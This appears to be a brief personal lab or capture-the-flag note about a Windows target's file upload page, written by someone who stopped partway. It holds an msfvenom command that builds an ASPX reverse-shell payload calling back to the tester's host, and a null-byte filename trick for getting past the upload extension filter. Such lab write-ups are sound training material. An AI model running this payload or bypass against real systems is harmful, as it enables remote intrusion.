Missed out on a 

/transfer.aspx directory which I found out after reading the writeup where I also took some hints


Here we can uplaod files and veiw it on below path

http://10.10.10.93/Uploadedfiles/merlin.jpg


Created a reverse shell payload for above scenarioa using

```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.7 LPORT=443 -f aspx -o rev_aspx_443.aspx 

```


I while uplaoding I captured the request with burp and made some changes to filename to bypass restriction

[[bypass file extension upload restriction]]

changes made to filename parameter is below

filename="rev_aspx_443.aspx%00.jpg"



and the file was uploaded successfully

so i got stuck here and saw the write up and got more confused so I stopped here and moved on to next machine
